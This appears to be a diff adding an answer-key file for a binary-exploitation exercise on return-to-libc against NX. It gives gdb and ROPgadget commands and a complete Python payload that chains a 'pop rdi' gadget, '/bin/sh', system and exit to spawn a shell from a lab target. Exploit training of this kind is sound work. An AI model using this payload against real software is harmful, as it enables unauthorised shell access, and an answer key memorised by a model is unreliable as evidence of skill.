@@ -1,0 +1,43 @@
+Solution — Exercise 05: Return-to-libc (NX Bypass)
+====================================================
+
+Step 1: Find your three addresses (in gdb)
+  gdb ./target
+  break main
+  run
+  p system          → e.g. 0x7ffff7e16290
+  p exit            → e.g. 0x7ffff7e08120
+  find &system,+9999999,"/bin/sh"
+                    → e.g. 0x7ffff7f73031
+
+Step 2: Find a 'pop rdi ; ret' gadget
+  ROPgadget --binary target | grep "pop rdi"
+  → e.g. 0x00000000004012a3 : pop rdi ; ret
+
+Step 3: Calculate padding
+  Buffer = 16 bytes, saved RBP = 8 bytes → 24 bytes of padding.
+
+Step 4: Build the payload
+  python3 -c "
+  import sys, struct
+
+  def p64(addr): return struct.pack('<Q', addr)
+
+  padding     = b'A' * 24
+  pop_rdi     = p64(0x4012a3)    # pop rdi ; ret
+  bin_sh      = p64(0x7ffff7f73031)
+  ret_gadget  = p64(0x40101a)    # bare ret (for alignment)
+  system_addr = p64(0x7ffff7e16290)
+  exit_addr   = p64(0x7ffff7e08120)
+
+  payload = padding + pop_rdi + bin_sh + ret_gadget + system_addr + exit_addr
+  sys.stdout.buffer.write(payload)
+  " | ./target
+
+  You will get a shell. Run: echo [SUCCESS]
+
+Why it works:
+  NX prevents executing code on the stack, but not jumping to
+  existing code. By chaining gadgets and library functions,
+  you build arbitrary computation from pre-existing instructions.
+  This is the foundation of all modern ROP exploitation.
